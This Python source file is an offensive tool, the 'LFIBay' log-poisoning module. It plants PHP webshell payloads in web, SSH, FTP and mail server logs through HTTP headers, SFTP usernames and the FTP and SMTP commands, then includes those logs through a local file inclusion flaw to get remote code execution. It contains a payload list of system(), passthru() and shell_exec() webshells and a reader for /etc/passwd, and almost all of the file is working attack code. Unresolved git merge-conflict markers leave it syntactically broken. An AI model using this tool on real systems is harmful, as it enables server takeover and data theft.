"""
LFIBay - Log Poisoning Module
<<<<<<< Updated upstream
Multi-service log poisoning for LFI to RCE exploitation
=======
Multi-service log poisoning for LFI to RCE
>>>>>>> Stashed changes
"""

import requests
import socket
import subprocess
import re


def poison_apache_log(target_url, payload, method='user_agent'):
<<<<<<< Updated upstream
    """
    Inject PHP code into Apache/Nginx access logs via User-Agent header
    Args:
        target_url: Target URL
        payload: PHP payload to inject (e.g., "<?php system($_GET['cmd']); ?>")
        method: Injection method ('user_agent', 'referer', 'cookie')
    Returns: Dictionary with injection result
    """
=======
    """Inject PHP code into Apache/Nginx logs via User-Agent"""
>>>>>>> Stashed changes
    try:
        headers = {}
        
        if method == 'user_agent':
            headers['User-Agent'] = payload
        elif method == 'referer':
            headers['Referer'] = payload
        elif method == 'cookie':
            headers['Cookie'] = f"session={payload}"
        else:
            headers['User-Agent'] = payload
        
        # Send request to poison the log
        response = requests.get(
            target_url,
            headers=headers,
            timeout=10,
            allow_redirects=False
        )
        
        return {
            'success': True,
            'method': method,
            'payload': payload,
            'status_code': response.status_code,
            'message': f'Log poisoned via {method}'
        }
        
    except Exception as e:
        return {
            'success': False,
            'method': method,
            'payload': payload,
            'error': str(e)
        }


def poison_nginx_log(target_url, payload):
<<<<<<< Updated upstream
    """
    Inject PHP code into Nginx logs via Referer header
    Args:
        target_url: Target URL
        payload: PHP payload to inject
    Returns: Dictionary with injection result
    """
=======
    """Inject PHP code into Nginx logs via Referer"""
    # Just use referer method, works better for nginx
>>>>>>> Stashed changes
    return poison_apache_log(target_url, payload, method='referer')


def poison_ssh_log(target_ip, payload, port=22):
    """
    Inject PHP code into SSH logs via curl SFTP username
    Uses curl with -k flag to bypass certificate verification
    Args:
        target_ip: Target IP address
        payload: PHP payload to inject
        port: SSH port (default: 22)
    Returns: Dictionary with injection result
    """
    try:
        # Use curl SFTP to inject payload in username field
        # This will be logged in /var/log/auth.log
        cmd = [
            'curl',
            '-k',  # Insecure - no cert verification
            '-m', '5',  # 5 second timeout
            f'sftp://{payload}@{target_ip}:{port}'
        ]
        
        # Execute curl (expected to fail, but payload will be logged)
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=10
        )
        
        return {
            'success': True,
            'method': 'ssh_log',
            'payload': payload,
            'message': 'SSH log poisoned via curl SFTP',
            'target': f'{target_ip}:{port}'
        }
        
    except subprocess.TimeoutExpired:
        # Timeout is expected, payload still injected
        return {
            'success': True,
            'method': 'ssh_log',
            'payload': payload,
            'message': 'SSH log poisoned (timeout expected)',
            'target': f'{target_ip}:{port}'
        }
    except Exception as e:
        return {
            'success': False,
            'method': 'ssh_log',
            'payload': payload,
            'error': str(e),
            'target': f'{target_ip}:{port}'
        }


def poison_ftp_log(target_ip, payload, port=21):
    """
    Inject PHP code into FTP logs via username field
    Args:
        target_ip: Target IP address
        payload: PHP payload to inject
        port: FTP port (default: 21)
    Returns: Dictionary with injection result
    """
    try:
        # Connect to FTP and send username (payload)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((target_ip, port))
        
        # Receive banner
        banner = sock.recv(1024).decode('utf-8', errors='ignore')
        
        # Send USER command with payload
        sock.send(f'USER {payload}\r\n'.encode())
        response = sock.recv(1024).decode('utf-8', errors='ignore')
        
        # Send QUIT
        sock.send(b'QUIT\r\n')
        sock.close()
        
        return {
            'success': True,
            'method': 'ftp_log',
            'payload': payload,
            'message': 'FTP log poisoned via USER command',
            'target': f'{target_ip}:{port}',
            'banner': banner.strip()
        }
        
    except Exception as e:
        return {
            'success': False,
            'method': 'ftp_log',
            'payload': payload,
            'error': str(e),
            'target': f'{target_ip}:{port}'
        }


def poison_mail_log(target_ip, payload, port=25):
    """
    Inject PHP code into mail logs via SMTP RCPT TO field
    Args:
        target_ip: Target IP address
        payload: PHP payload to inject
        port: SMTP port (default: 25)
    Returns: Dictionary with injection result
    """
    try:
        # Connect to SMTP
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((target_ip, port))
        
        # Receive banner
        banner = sock.recv(1024).decode('utf-8', errors='ignore')
        
        # Send HELO
        sock.send(b'HELO localhost\r\n')
        response = sock.recv(1024).decode('utf-8', errors='ignore')
        
        # Send MAIL FROM
        sock.send(b'MAIL FROM:<test@test.com>\r\n')
        response = sock.recv(1024).decode('utf-8', errors='ignore')
        
        # Send RCPT TO with payload
        sock.send(f'RCPT TO:<{payload}>\r\n'.encode())
        response = sock.recv(1024).decode('utf-8', errors='ignore')
        
        # Send QUIT
        sock.send(b'QUIT\r\n')
        sock.close()
        
        return {
            'success': True,
            'method': 'mail_log',
            'payload': payload,
            'message': 'Mail log poisoned via RCPT TO',
            'target': f'{target_ip}:{port}',
            'banner': banner.strip()
        }
        
    except Exception as e:
        return {
            'success': False,
            'method': 'mail_log',
            'payload': payload,
            'error': str(e),
            'target': f'{target_ip}:{port}'
        }


def detect_log_paths(target_url, cookies=None):
    """
    Auto-detect accessible log file paths via LFI
    Args:
        target_url: Target URL with LFI parameter
        cookies: Session cookies
    Returns: List of accessible log paths
    """
    common_log_paths = [
        '/var/log/apache/access.log',
        '/var/log/apache2/access.log',
        '/var/log/nginx/access.log',
        '/var/log/httpd/access_log',
        '/var/log/auth.log',
        '/var/log/secure',
        '/var/log/vsftpd.log',
        '/var/log/mail.log',
    ]
    
    accessible_paths = []
    
    for log_path in common_log_paths:
        try:
            # Test if log path is accessible
            test_url = target_url.replace('INJECT', log_path)
            response = requests.get(test_url, cookies=cookies, timeout=5)
            
            # Check for log file indicators
            content = response.text.lower()
            log_indicators = [
                'mozilla/',
                'get ',
                'post ',
                'http/1.',
                '200 ',
                '404 ',
                'user-agent:',
            ]
            
            if any(indicator in content for indicator in log_indicators):
                accessible_paths.append(log_path)
                
        except:
            continue
    
    return accessible_paths


def generate_php_payload(payload_type='webshell'):
    """
    Generate PHP payloads for log injection
    Args:
        payload_type: Type of payload ('webshell', 'info', 'readfile', 'reverse_shell')
    Returns: PHP payload string
    """
    payloads = {
        'webshell': "<?php system($_GET['cmd']); ?>",
        'info': "<?php phpinfo(); ?>",
        'readfile': "<?php readfile('/etc/passwd'); ?>",
        'id': "<?php system('id'); ?>",
        'whoami': "<?php system('whoami'); ?>",
        'passthru': "<?php passthru($_GET['c']); ?>",
        'exec': "<?php echo exec($_GET['cmd']); ?>",
        'shell_exec': "<?php echo shell_exec($_GET['cmd']); ?>",
    }
    
    return payloads.get(payload_type, payloads['webshell'])


def test_log_inclusion(target_url, log_path, test_string, cookies=None):
    """
    Test if a log file can be included and contains our injected string
    Args:
        target_url: URL with LFI parameter
        log_path: Path to log file
        test_string: Unique string to look for
        cookies: Session cookies
    Returns: Boolean indicating success
    """
    try:
        # Include the log file
        include_url = target_url.replace('INJECT', log_path)
        response = requests.get(include_url, cookies=cookies, timeout=10)
        
        # Check if our test string appears in response
        return test_string in response.text
        
    except:
        return False


def get_log_paths_for_service(service):
    """
    Get common log paths for a specific service
    Args:
        service: Service name ('apache', 'nginx', 'ssh', 'ftp', 'mail')
    Returns: List of log paths
    """
    paths = {
        'apache': [
            '/var/log/apache/access.log',
            '/var/log/apache/error.log',
            '/var/log/apache2/access.log',
            '/var/log/apache2/error.log',
            '/var/log/httpd/access_log',
            '/var/log/httpd/error_log',
            '/usr/local/apache/logs/access_log',
            '/var/www/logs/access_log',
        ],
        'nginx': [
            '/var/log/nginx/access.log',
            '/var/log/nginx/error.log',
            '/usr/local/nginx/logs/access.log',
            '/var/log/nginx/localhost.access_log',
        ],
        'ssh': [
            '/var/log/auth.log',
            '/var/log/secure',
            '/var/log/sshd.log',
        ],
        'ftp': [
            '/var/log/vsftpd.log',
            '/var/log/ftp.log',
            '/var/log/xferlog',
            '/var/log/proftpd.log',
        ],
        'mail': [
            '/var/log/mail.log',
            '/var/log/maillog',
            '/var/log/exim4/mainlog',
            '/var/log/sendmail.log',
        ],
    }
    
    return paths.get(service, [])


def create_attack_plan(target_url, target_ip=None, accessible_logs=None):
    """
    Create a log poisoning attack plan based on accessible logs
    Args:
        target_url: Target URL
        target_ip: Target IP (optional, for SSH/FTP/Mail)
        accessible_logs: List of accessible log paths
    Returns: Dictionary with attack plan
    """
    plan = {
        'web_logs': [],
        'ssh_logs': [],
        'ftp_logs': [],
        'mail_logs': [],
        'recommended_order': []
    }
    
    if accessible_logs:
        for log_path in accessible_logs:
            if 'apache' in log_path or 'nginx' in log_path or 'httpd' in log_path:
                plan['web_logs'].append({
                    'path': log_path,
                    'method': 'poison_apache_log',
                    'difficulty': 'easy'
                })
            elif 'auth' in log_path or 'ssh' in log_path or 'secure' in log_path:
                if target_ip:
                    plan['ssh_logs'].append({
                        'path': log_path,
                        'method': 'poison_ssh_log',
                        'difficulty': 'medium'
                    })
            elif 'ftp' in log_path or 'vsftpd' in log_path:
                if target_ip:
                    plan['ftp_logs'].append({
                        'path': log_path,
                        'method': 'poison_ftp_log',
                        'difficulty': 'medium'
                    })
            elif 'mail' in log_path:
                if target_ip:
                    plan['mail_logs'].append({
                        'path': log_path,
                        'method': 'poison_mail_log',
                        'difficulty': 'hard'
                    })
    
    # Recommended order: easiest first
    plan['recommended_order'] = (
        plan['web_logs'] +
        plan['ftp_logs'] +
        plan['ssh_logs'] +
        plan['mail_logs']
    )
    
    return plan
